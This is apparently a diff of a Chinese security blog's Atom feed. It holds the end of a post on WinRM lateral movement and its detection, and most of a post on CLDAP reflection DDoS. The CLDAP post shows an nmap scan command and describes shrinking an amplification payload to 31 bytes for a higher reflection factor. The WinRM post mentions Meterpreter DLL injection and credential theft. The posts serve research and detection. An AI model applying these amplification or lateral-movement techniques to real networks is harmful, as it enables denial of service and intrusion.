+&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;25&#x2F;VJWiwvtqs5PM1bl.png&quot; alt=&quot;12&quot; style=&quot;zoom:25%;&quot; &#x2F;&gt;
+&lt;p&gt;至此，DLL文件被注入进目标Windows服务器的内存并获得Meterpreter Shell。当然，也可以直接使用PowerSploit完成对网络的进一步探测。例如使用Recon模块对内网主机端口扫描：&lt;&#x2F;p&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;25&#x2F;H5BuRziXLpKM37E.png&quot; alt=&quot;13&quot; style=&quot;zoom:35%;&quot; &#x2F;&gt;
+&lt;p&gt;或者尝试获取域控制器的密码等等：&lt;&#x2F;p&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;25&#x2F;V6xuEfQ1t9XrhoL.png&quot; alt=&quot;14&quot; style=&quot;zoom:35%;&quot; &#x2F;&gt;
+&lt;p&gt;可见，透过WinRM服务可以使用多种渗透框架对目标网络进行渗透攻击，此时WinRM更像是一个通道或者一扇门。&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;winrmhuo-dong-de-bu-huo-ji-jian-ce&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#winrmhuo-dong-de-bu-huo-ji-jian-ce&quot; aria-label=&quot;Anchor link for: winrmhuo-dong-de-bu-huo-ji-jian-ce&quot;&gt;WinRM活动的捕获及检测&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;以第二节的攻击活动作为基础，尝试从Windows日志以及流量层面检测使用WinRM服务进行的横向移动。&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;tong-guo-windowsri-zhi-jian-ce-winrmhuo-dong&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#tong-guo-windowsri-zhi-jian-ce-winrmhuo-dong&quot; aria-label=&quot;Anchor link for: tong-guo-windowsri-zhi-jian-ce-winrmhuo-dong&quot;&gt;通过Windows日志检测WinRM活动&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;使用WinRM服务时，Windows会在两个位置记录相关日志，分别为&lt;code&gt;%SystemRoot%\System32\Winevt\Logs\Security.evtx&lt;&#x2F;code&gt;Windows安全事件日志及&lt;code&gt;%SystemRoot%\System32\Winevt\Logs\Microsoft-Windows-WinRM%4Operational.evtx&lt;&#x2F;code&gt;WinRM服务操作日志。&lt;&#x2F;p&gt;
+&lt;p&gt;为方便测试，先分别清空本地Windows主机和远程Windows服务器的这两处日志。以PowerShell Remoting为例，从本地Windows主机登录远程Windows服务器执行一条系统命令&lt;code&gt;ipconfig&lt;&#x2F;code&gt;后退出，随后查看此过程产生的日志。&lt;&#x2F;p&gt;
+&lt;p&gt;本地Windows主机记录的两处日志如图：&lt;&#x2F;p&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;25&#x2F;UCOgoiq7Ldb1Fa2.png&quot; alt=&quot;21&quot; style=&quot;zoom:25%;&quot; &#x2F;&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;30&#x2F;f51Xro6JNidsMq8.png&quot; alt=&quot;23&quot; style=&quot;zoom:25%;&quot; &#x2F;&gt;
+&lt;p&gt;在安全事件日志中产生了三次事件ID为&lt;code&gt;4648&lt;&#x2F;code&gt;的Windows登录事件，被登录主机为&lt;code&gt;WIN-IMRNLMU4L5U&lt;&#x2F;code&gt;，并且指向PowerShell进程：&lt;&#x2F;p&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;25&#x2F;b5SKcUvLCMOsXhJ.png&quot; alt=&quot;22&quot; style=&quot;zoom:30%;&quot; &#x2F;&gt;
+&lt;p&gt;&lt;code&gt;4648&lt;&#x2F;code&gt;事件是Windows用于记录显式凭据登录的事件，并且无论登录是否成功都会记录。由于PowerShell Remoting会使用显式的弹框提示用户输入登录远程主机的账户密码，因此产生此日志。&lt;&#x2F;p&gt;
+&lt;p&gt;WinRM服务操作日志中记录了与WinRM服务所有相关的操作，并且从时间线上依次有WSMan初始化、WSMan API调用（初始化建立连接）、用户身份验证请求及响应、WSMan API调用（具体操作）请求及响应。从日志的详情中能看到每一次操作的具体情况，例如客户端发送命令给远程主机：&lt;&#x2F;p&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;25&#x2F;oAIp6YZJ2VkxgsH.png&quot; alt=&quot;24&quot; style=&quot;zoom:26%;&quot; &#x2F;&gt;
+&lt;p&gt;在远程Windows服务器上，再来看这两个日志。&lt;&#x2F;p&gt;
+&lt;p&gt;与发起登录的Windows主机不同，这里安全事件日志上分别生成了事件ID为&lt;code&gt;4776&lt;&#x2F;code&gt;、&lt;code&gt;4672&lt;&#x2F;code&gt;、&lt;code&gt;4624&lt;&#x2F;code&gt;、&lt;code&gt;4634&lt;&#x2F;code&gt;的四种日志，分别对应凭据验证、特殊登录、登录及注销四个事件，并且也都产生了三次。&lt;&#x2F;p&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;25&#x2F;lWaHuC4poxAq1Nn.png&quot; alt=&quot;25&quot; style=&quot;zoom:30%;&quot; &#x2F;&gt;
+&lt;p&gt;&lt;code&gt;4776&lt;&#x2F;code&gt;事件记录远程主机发送验证包进行NTLM验证的过程，发送的验证包为为&lt;code&gt;MICROSOFT_AUTHENTICATION_PACKAGE_V1_0&lt;&#x2F;code&gt;。&lt;code&gt;4672&lt;&#x2F;code&gt;事件记录Windows赋予登录账户特殊权限的过程，在使用PowerShell Remoting登录的过程中，Windows服务器赋予登录账户特殊权限，并形成与管理员账户的某些等效特权（但并不完全等同于管理员账户）：&lt;&#x2F;p&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;25&#x2F;bk5RPxulzoMnfae.png&quot; alt=&quot;26&quot; style=&quot;zoom:26%;&quot; &#x2F;&gt;
+&lt;p&gt;&lt;code&gt;4624&lt;&#x2F;code&gt;事件是账号成功登录的标志，&lt;code&gt;4643&lt;&#x2F;code&gt;事件则是账户退出登录的标志。&lt;&#x2F;p&gt;
+&lt;p&gt;综合这四个事件的日志可以判断，一台Windows主机使用NTLM认证的方式成功登录了当前Windows服务器，并拥有一定的管理员特权。&lt;&#x2F;p&gt;
+&lt;p&gt;转向WinRM服务操作日志，这里只记录了四个事件，只能看到WSMan API被调用并给出响应，不够详细：&lt;&#x2F;p&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;25&#x2F;CHyN6BJIKWZ7pE3.png&quot; alt=&quot;27&quot; style=&quot;zoom:26%;&quot; &#x2F;&gt;
+&lt;p&gt;从两台主机的日志可以看出，WinRM服务连接的请求发起方记录明显要比被连接方更详细，远程Windows服务器作为被攻击主机，在日志上只能记录Windows远程登录的详细情况，而无法记录WinRM操作较详细的过程，这对横向移动的检测明显不利。&lt;&#x2F;p&gt;
+&lt;p&gt;借助WinRM服务进行的内网横移活动，日志层面监控需要借助新的工具来实现记录，例如&lt;a href=&quot;https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;sysinternals&#x2F;downloads&#x2F;sysmon&quot;&gt;Sysmon&lt;&#x2F;a&gt;。从日本Cert&#x2F;CC的&lt;a href=&quot;https:&#x2F;&#x2F;jpcertcc.github.io&#x2F;ToolAnalysisResultSheet&#x2F;details&#x2F;WinRM.htm&quot;&gt;研究&lt;&#x2F;a&gt;可以看到，Sysmon能较完整的记录WinRM服务的操作日志。&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;tong-guo-wang-luo-liu-liang-jian-ce-winrmhuo-dong&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#tong-guo-wang-luo-liu-liang-jian-ce-winrmhuo-dong&quot; aria-label=&quot;Anchor link for: tong-guo-wang-luo-liu-liang-jian-ce-winrmhuo-dong&quot;&gt;通过网络流量检测WinRM活动&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;我们通过winrm的&lt;code&gt;invoke&lt;&#x2F;code&gt;参数在远程Windows服务器上生成一个运行计算器程序的进程，并在此Windows服务器上捕获过程中产生的网络流量。&lt;&#x2F;p&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;25&#x2F;nFj8RvPr31LckIs.png&quot; alt=&quot;18&quot; style=&quot;zoom:26%;&quot; &#x2F;&gt;
+&lt;p&gt;从图中可以看到，客户端PC使用NTLM认证登录Windows服务器，并随后向其发送了经过加密的WS-Management协议消息。由于会话进行了加密，因此无法从流量内容中解密出具体的操作请求与响应内容：&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;POST &#x2F;wsman HTTP&#x2F;1.1
+&lt;&#x2F;span&gt;&lt;span&gt;Authorization: Negotiate TlRMTVNTUAADAAAAGAAYAK4AAAAIAQgBxgAAAB4AHgBYAAAAGgAaAHYAAAAeAB4AkAAAABAAEADOAQAANYKI4gYAchcAAAAPQA&#x2F;P&#x2F;h+iVrUOR96DLmXOKlcASQBOAC0ATwBNAFoASwBLAE8ANQBTADIAVwBIAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAVwBJAE4ALQBPAE0AWgBLAEsATwA1AFMAMgBXAEgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA9MKfRjLb04PzgEvw8c8H3AEBAAAAAAAAONk&#x2F;OuNt1QFYO76+xRQ5LQAAAAACAB4AVwBJAE4ALQBJAE0AUgBOAEwATQBVADQATAA1ADEAAQAeAFcASQBOAC0ASQBNAFIATgBMAE0AVQA0AEwANQAxAAQAHgBXAEkATgAtAEkATQBSAE4ATABNAFUANABMADUAMQADAB4AVwBJAE4ALQBJAE0AUgBOAEwATQBVADQATAA1ADEABwAIADjZPzrjbdUBBgAEAAIAAAAIADAAMAAAAAAAAAAAAAAAADAAAIc2vSJKkSPg+7uRSE04RPyCY4BjWZ4SV7AX5qGi9IZSAAAAAAAAAAAAAAAAFQ&#x2F;q0cp5XKIemClSmHpBig==
+&lt;&#x2F;span&gt;&lt;span&gt;Content-Type: multipart&#x2F;encrypted;protocol=&amp;quot;application&#x2F;HTTP-SPNEGO-session-encrypted&amp;quot;;boundary=&amp;quot;Encrypted Boundary&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;User-Agent: Microsoft WinRM Client
+&lt;&#x2F;span&gt;&lt;span&gt;Host: 10.0.83.30:5985
+&lt;&#x2F;span&gt;&lt;span&gt;Content-Length: 2586
+&lt;&#x2F;span&gt;&lt;span&gt;Connection: Keep-Alive
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;--Encrypted Boundary
+&lt;&#x2F;span&gt;&lt;span&gt;Content-Type: application&#x2F;HTTP-SPNEGO-session-encrypted
+&lt;&#x2F;span&gt;&lt;span&gt;OriginalContent: type=application&#x2F;soap+xml;charset=UTF-16;Length=2330
+&lt;&#x2F;span&gt;&lt;span&gt;--Encrypted Boundary
+&lt;&#x2F;span&gt;&lt;span&gt;Content-Type: application&#x2F;octet-stream
+&lt;&#x2F;span&gt;&lt;span&gt;.............Q3R....3H......?.xL}..8.I
+&lt;&#x2F;span&gt;&lt;span&gt;............................(此处省略)
+&lt;&#x2F;span&gt;&lt;span&gt;[...3...a...|^.sDox&amp;#39;.&amp;quot;...Bww.--Encrypted Boundary--
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;HTTP&#x2F;1.1 200
+&lt;&#x2F;span&gt;&lt;span&gt;Content-Type: multipart&#x2F;encrypted;protocol=&amp;quot;application&#x2F;HTTP-SPNEGO-session-encrypted&amp;quot;;boundary=&amp;quot;Encrypted Boundary&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;Server: Microsoft-HTTPAPI&#x2F;2.0
+&lt;&#x2F;span&gt;&lt;span&gt;Date: Wed, 18 Sep 2019 05:37:57 GMT
+&lt;&#x2F;span&gt;&lt;span&gt;Content-Length: 2202
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;--Encrypted Boundary
+&lt;&#x2F;span&gt;&lt;span&gt;Content-Type: application&#x2F;HTTP-SPNEGO-session-encrypted
+&lt;&#x2F;span&gt;&lt;span&gt;OriginalContent: type=application&#x2F;soap+xml;charset=UTF-16;Length=1946
+&lt;&#x2F;span&gt;&lt;span&gt;--Encrypted Boundary
+&lt;&#x2F;span&gt;&lt;span&gt;Content-Type: application&#x2F;octet-stream
+&lt;&#x2F;span&gt;&lt;span&gt;.........t3.d.O.....&#x2F;....-....N7C..B....2.....r.
+&lt;&#x2F;span&gt;&lt;span&gt;.............................(此处省略)
+&lt;&#x2F;span&gt;&lt;span&gt;...DP.....@...A..e...Z....6.7...M.l|.PU...vA.J...7.T...--Encrypted Boundary--
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;经过测试，使用PowerShell Remoting、Evil-WinRM工具产生的WinRM连接流量均与之类似。可见在WinRM服务未开启监听HTTPS端口的情况下，Windows依然会加密WinRM会话以保证通信数据的完整性。不过，仍然可以通过HTTP请求与响应中的明文部分捕获WinRM认证及操作的行为，例如&lt;code&gt;Microsoft WinRM Client&lt;&#x2F;code&gt;、&lt;code&gt;Encrypted Boundary&lt;&#x2F;code&gt;、&lt;code&gt;HTTP-SPNEGO-session-encrypted&lt;&#x2F;code&gt;等关键字，并以此进行关联产生侦测到WinRM服务成功调用的预警。&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;zong-jie&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#zong-jie&quot; aria-label=&quot;Anchor link for: zong-jie&quot;&gt;总结&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;根据多个APT报告，借助Windows服务进行内网横向移动的技术受到越来越多攻击者的青睐，这将进一步打破攻防对抗的平衡，使得防御方举步维艰。本文从WS-Management协议出发，介绍了Windows中的WinRM服务，同时通过实例对该服务用于横向移动的过程进行了阐述和举例。最后，在Windows日志层面和流量层面分别探讨了检测WinRM横向移动的可能性。&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;can-kao&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#can-kao&quot; aria-label=&quot;Anchor link for: can-kao&quot;&gt;参考&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Windows_Remote_Management&quot;&gt;Windows Remote Management&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;redcanary.com&#x2F;blog&#x2F;lateral-movement-winrm-wmi&quot;&gt;Lateral Movement Using WinRM and WMI&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.bloggingforlogging.com&#x2F;2018&#x2F;01&#x2F;24&#x2F;demystifying-winrm&quot;&gt;Demystifying WinRM&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;devops-collective-inc.gitbook.io&#x2F;secrets-of-powershell-remoting&#x2F;remoting-basics&quot;&gt;Secrets of PowerShell Remoting&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;attack.mitre.org&#x2F;techniques&#x2F;T1028&#x2F;&quot;&gt;Windows Remote Management(ATT&amp;amp;CK)&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;&lt;strong&gt;* 转载请注明作者及来源&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>剖析CLDAP协议DRDoS</title>
+        <published>2018-07-31T00:00:00+00:00</published>
+        <updated>2018-07-31T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Unknown
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://0x0c.cc/posts/pou-xi-cldapxie-yi-drdos/"/>
+        <id>https://0x0c.cc/posts/pou-xi-cldapxie-yi-drdos/</id>
+        
+        <content type="html" xml:base="https://0x0c.cc/posts/pou-xi-cldapxie-yi-drdos/">&lt;p&gt;&lt;strong&gt;前言：&lt;&#x2F;strong&gt; 2018年上半年，得益于Memcache近5万的反射放大倍数，DDoS的峰值流量已经达到了一个前所未有的新高度—1.7Tbps，这也使得Memcache DRDoS成为目前DDoS的中坚力量。而与Memcache DRDoS相比，2016年Akamai曝光的CLDAP DRDoS虽然没有前者极高的效率，但是其56~70倍的放大倍数在DDoS家族中也依然是一名佼佼者，因此也应引起关注。&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;一、CLDAP协议缺陷&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;轻量目录访问协议（LDAP）被定义在&lt;a href=&quot;https:&#x2F;&#x2F;tools.ietf.org&#x2F;html&#x2F;rfc2251&quot;&gt;RFC2251&lt;&#x2F;a&gt;（LDAPv3）中，由于LDAP是以TCP字节流的方式进行数据传输，其必要的绑定操作和频繁的数据搜索查询会在一定程度消耗较多的TCP连接资源，于是IETF在1995年发布了面向无连接的轻量目录访问协议（CLDAP），官方文档为&lt;a href=&quot;https:&#x2F;&#x2F;tools.ietf.org&#x2F;html&#x2F;rfc1798&quot;&gt;RFC1798&lt;&#x2F;a&gt;（2003年&lt;a href=&quot;https:&#x2F;&#x2F;tools.ietf.org&#x2F;html&#x2F;rfc3352&quot;&gt;RFC3352&lt;&#x2F;a&gt;将CLDAP置为历史状态）。在CLDAP中只提供三种操作：searchRequest、searchResponse （searchResEntry和searchResDone）、abandonRequest，在不提供身份验证功能的情况下，客户端可以使用UDP数据报对LDAP服务器389端口发起操作请求。由于客户端发起searchRequest后服务端将返回searchResEntry和searchResDone两条应答消息，因此一般情况下执行该操作将具有较小数据包反射出较大数据包的效果，这一缺陷随即被利用进行反射放大DDoS攻击。&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;07&#x2F;31&#x2F;5b5fc44a7658d.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;二、CLDAP Reflection DDoS现状&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;根据Akamai SIRT发布的&lt;a href=&quot;https:&#x2F;&#x2F;www.akamai.com&#x2F;us&#x2F;en&#x2F;about&#x2F;our-thinking&#x2F;threat-advisories&#x2F;connection-less-lightweight-directory-access-protocol-reflection-ddos-threat-advisory.jsp&quot;&gt;报告&lt;&#x2F;a&gt;，目前捕获到的CLDAP DRDoS最高峰值流量为24Gbps，最大反射倍数为70倍。由于CLDAP未被广泛运用，开源LDAP软件openLDAP早已不再支持UDP协议的请求。事实上，现阶段进行CLDAP DRDoS攻击被利用最多的服务是Windows服务器的活动目录服务Active Directory（AD）。通常AD服务会在TCP端口389上监听来自客户端的LDAP操作请求，同时也会在UDP端口389上使用CLDAP协议来等待执行rootDSE的搜索操作（rootDSE条目在AD服务配置时创建，且允许未经身份验证的客户端对服务器的配置状态、功能和扩展属性进行查询，也被称作“AD ping”）。一些Windows服务器的AD服务监听端口暴露在公网，进而被利用来执行rootDSE查询产生放大反射DDoS攻击，在Exploit-DB上已经有安全研究者公开了&lt;a href=&quot;https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;40703&#x2F;&quot;&gt;Perl利用脚本&lt;&#x2F;a&gt;：。使用Nmap的ldap-rootdse脚本也可以对该缺陷进行扫描确认：&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;nmap&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -Pn -sSU -p&lt;&#x2F;span&gt;&lt;span&gt; 389,636&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --script&lt;&#x2F;span&gt;&lt;span&gt; ldap-rootdse 123.123.123.123
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;07&#x2F;31&#x2F;5b5fc16ee8218.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;可见存在缺陷的服务器将会返回rootDSE的条目、条目属性等配置信息。&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;三、对Payload的改进和探索&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;针对Exploit-DB中rootDSE CLDAP DRDoS的利用脚本，其Payload为：&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;07&#x2F;31&#x2F;5b5fd06cb965c.png&quot; alt=&quot;&quot; &#x2F;&gt;由于LDAP和CLDAP在传输数据时是先将数据封装成为LDAPmessage消息体后使用ASN.1下的BER进行编码后再传输的，我们可以使用在线工具&lt;a href=&quot;http:&#x2F;&#x2F;asn1-playground.oss.com&#x2F;&quot;&gt;ASN.1 Playground&lt;&#x2F;a&gt;对此Payload进行还原（还原时需先编译加载RFC2251中对LDAPmessage的ASN.1结构体定义，也可以直接使用GitHub中相关研究者定义好的&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Kampbell&#x2F;ISODE&#x2F;blob&#x2F;37f161e65f11348ef6fca2925d399d611df9f31b&#x2F;isode%2B%2B&#x2F;code&#x2F;iso&#x2F;itu&#x2F;osi&#x2F;asn1&#x2F;asn&#x2F;Lightweight-Directory-Access-Protocol-V3.asn&quot;&gt;asn文件&lt;&#x2F;a&gt;）：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;07&#x2F;31&#x2F;5b5fd68793c82.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;可以看出此Payload是一次searchRequest操作的BER编码，其对top类的objectClass必选属性进行查询。通过测试捕获，该Payload平均能达到50倍左右的反射放大效率。&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;07&#x2F;31&#x2F;5b5fdba566e79.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;但是如果将解码出的LDAPmessage再重新编码回去，会发现BER编码位数减少，与公开的Payload相比缺失了一部分：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;07&#x2F;31&#x2F;5b5fe08653931.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;如果此编码可用，将会降低Payload长度（需要在末尾再补一个\x00作为LDAPmessage结尾）：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;07&#x2F;31&#x2F;5b5fe11cd0fba.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;通过与原Payload相比较，可以发现原来Payload多出的部分（\x30\x84…）其实上是一段LDAPmessage响应消息，因此在编码时被认为不应当出现在请求报文中，所以完全可以去掉（暂不清楚脚本原作者这里的意图）。测试捕获后发现，改进后的这段40字节的Payload可用，且可以将反射放大效率提升至平均73倍左右，相比UScert公布的56~70倍数据提升了近18%，目前在公开渠道也暂未找到更为精简的Payload：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;07&#x2F;31&#x2F;5b5ff7174b40d.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;事实上，要得到最精简的Payload，还是要回到协议本身。从RFC2251中可以看出searchRequest操作共有8个字段，而接收自定义输入的字段只有baseObject、filter、attributes三个。在上述40字节Payload基础上，我们能做文章的依然是filter字段和attributes字段。&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;08&#x2F;11&#x2F;5b6e5c930f058.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;经过构造filter和attributes字段，我们得到了长度为31字节的更为精简的Payload。该Payload能达到均值约89倍的反射放大效率，相比UScert公布的数据又提升了41%，如果以Akamai捕获到的最高反射数据包大小3662字节计算，新的Payload能达到最高118倍的反射放大倍数，这将刷新目前CLDAP DRDoS理论放大倍数数据：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;08&#x2F;11&#x2F;5b6e63839260e.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;四、影响面分析&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;我们在ZoomEye中通过搜索比较发现，存在缺陷的Windows服务器具有特定的banner信息：&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;0\x84\x00\x00\x00\x10\x02\x01\x01a\x84\x00\x00\x00\x07\n\x01\x00\x04\x00\x04\x00
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;结合编码中的每一个标志位来看，该banner信息与LDAP服务器bindResponse响应报文编码十分相似，因此推断出现该banner信息的原因，是由于ZoomEye扫描引擎在扫描到存在缺陷的LDAP服务器时服务器做出了一次绑定操作的响应，且告知客户端绑定成功，这也是在客户端searchRequest之前的必要操作：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;07&#x2F;31&#x2F;5b60076bb1a4b.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;使用此banner规则在ZoomEye中搜索共有214673条记录，约占所有LDAP服务器总数411527的52.2%：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;08&#x2F;11&#x2F;5b6e6b7f2296f.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;考虑到不同服务器在不同时间节点上会出现配置上的变动，于是我们以2015、2016、2017这三年作为区分，分别采集前1000条数据对服务器缺陷进行有效性验证。结果如下表所示：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;08&#x2F;11&#x2F;5b6e8dac34458.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;按照得出的占比，可以估算出目前互联网中存在缺陷的服务器总数：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;08&#x2F;11&#x2F;5b6e91b9e5548.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;因此我们认为，目前互联网中至少有2万台Windows服务器存在被利用进行CLDAP DRDoS攻击的风险，当然这仍然依赖于ZoomEye所提供的数据，真实情况有更多。同时，我们获取了这3000条数据中153台缺陷服务器的反射数据包，其中最大的数据包长度为3208字节，最小的数据包长度为1918字节，153个数据包平均包长度为2665字节。根据这些捕获到的数据，现阶段CLDAP DRDoS的反射放大倍数应当为62~103倍，平均反射放大倍数为86倍。&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;08&#x2F;11&#x2F;5b6e9c3d782a3.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;五、总结&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
